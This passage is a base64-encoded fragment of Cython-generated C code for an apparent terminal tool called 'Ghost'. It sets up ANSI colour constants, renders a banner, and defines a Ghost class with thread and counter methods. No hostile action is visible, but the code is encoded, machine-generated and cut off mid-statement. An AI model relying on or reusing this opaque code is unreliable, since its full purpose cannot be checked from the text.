IF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzExKSB7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jbGVhcik7CiAgICAgICAgX19weXhfdF8yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyOwogICAgICB9IGVsc2UgewogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xzKTsKICAgICAgICBfX3B5eF90XzIgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2xzOwogICAgICB9CiAgICAgIF9fcHl4X3RfNiA9IDE7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF90XzJ9OwogICAgICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjMsIF9fcHl4X0wyX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAgICAgCiAgICB9CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICBnb3RvIF9fcHl4X0w3X3RyeV9lbmQ7CiAgICBfX3B5eF9MMl9lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAKICAgICB7CiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApOwogICAgICBnb3RvIF9fcHl4X0wzX2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgfQogICAgX19weXhfTDNfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzcsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF9MN190cnlfZW5kOjsKICB9CgogIAogIF9fcHl4X3RfNCA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfMiA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTV9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8yLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyOCwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMiA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZW5kZXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF81ID0gX19QeXhfUHlMaXN0X1BhY2soMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3doaXRlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd2hpdGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CgogIAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDUgOiAwKV0gPSB7X19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1R9OwogICAgX19weXhfdF8xMCA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoNSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9mb250LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmxvY2ssIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDApIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29sb3JzLCBfX3B5eF90XzUsIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWxpZ24sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jZW50ZXIsIF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzKzIsIDIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjksIF9fcHl4X0wxX2Vycm9yKQogICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYmFja2dyb3VuZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlZCwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGFjZSwgUHlfVHJ1ZSwgX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrMiwgNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgICBfX3B5eF90XzMgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF80LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzYsICgyLV9fcHl4X3RfNikgfCAoX19weXhfdF82Kl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfMTApOwogICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyOSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HSE9TVCwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF80ID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF8xMCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR0hPU1QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAzMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBfX3B5eF90XzV9OwogICAgX19weXhfdF8zID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8xMCA9IE5VTEw7CiAgX19QeXhfSU5DUkVGKF9fcHl4X2J1aWx0aW5fcHJpbnQpOwogIF9fcHl4X3RfNSA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzE1fTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAzMiwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfNSA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMzMsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMX07CiAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDItX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDMzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIH0KICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHkzTWV0YWNsYXNzUHJlcGFyZSgoUHlPYmplY3QgKikgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db2xvcnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db2xvcnMsIChQeU9iamVjdCAqKSBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIChQeU9iamVjdCAqKSBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMzYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwoKICAKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfUkVTRVQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMG0pIDwgKDApKSBfX1BZWF9FUlIoMCwgMzcsIF9fcHl4X0wxX2Vycm9yKQoKICAKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQk9MRCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8xbSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzOCwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9SRUQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTFtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDM5LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dSRUVOLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzkybSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0MCwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9ZRUxMT1csIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTNtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQxLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0JMVUUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTRtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQyLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X01BR0VOVEEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTVtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQzLCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0NZQU4sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOTZtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ0LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1dISVRFLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91Xzk3bSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0NSwgX19weXhfTDFfZXJyb3IpCgogIAogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9PUkFOR0UsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNV8yMDhtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ2LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0xJTUUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNV8xMThtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ3LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BJTkssIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMzhfNV8xOThtKSA8ICgwKSkgX19QWVhfRVJSKDAsIDQ4LCBfX3B5eF9MMV9lcnJvcikKCiAgCiAgaWYgKF9fUHl4X1NldE5hbWVJbkNsYXNzKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1BVUlBMRSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zOF81XzkzbSkgPCAoMCkpIF9fUFlYX0VSUigwLCA0OSwgX19weXhfTDFfZXJyb3IpCgogIAogIF9fcHl4X3RfNCA9IF9fUHl4X1B5M0NsYXNzQ3JlYXRlKCgoUHlPYmplY3QqKSZQeVR5cGVfVHlwZSksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db2xvcnMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3R1cGxlLCBfX3B5eF90XzMsIE5VTEwsIDAsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAzNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db2xvcnMsIF9fcHl4X3RfNCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfNCA9IE5VTEw7CiAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9Db2xvcnMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCA1MiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgX19weXhfdF82ID0gMTsKICB7CiAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF80LCBOVUxMfTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMS1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfQywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDUyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHkzTWV0YWNsYXNzUHJlcGFyZSgoUHlPYmplY3QgKikgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdHVwbGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0LCAoUHlPYmplY3QgKikgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmLCAoUHlPYmplY3QgKikgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDU1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF8xX19pbml0X18sIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9fX2luaXQsIE5VTEwsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90ZiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgKChQeU9iamVjdCAqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDU2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICBpZiAoX19QeXhfU2V0TmFtZUluQ2xhc3MoX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaW5pdCwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDU2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF8zaW5jcmVtZW50X2NvdW50ZXIsIDAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdF9pbmNyZW1lbnRfY291bnRlciwgTlVMTCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RmLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCAoKFB5T2JqZWN0ICopX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0pKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNzQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIGlmIChfX1B5eF9TZXROYW1lSW5DbGFzcyhfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfdF81KSA8ICgwKSkgX19QWVhfRVJSKDAsIDc0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgCiAgX19weXhfdF81ID0gX19QeXhfQ3lGdW5jdGlvbl9OZXcoJl9fcHl4X21kZWZfMnRmXzVHaG9zdF81c2V0X2FjdGl2ZV90aHJlYWRzLCAwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rfc2V0X2FjdGl2ZV90aHJlYWRzLCBOVUxMLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsICgoUHlPYmplY3QgKilfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSkpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0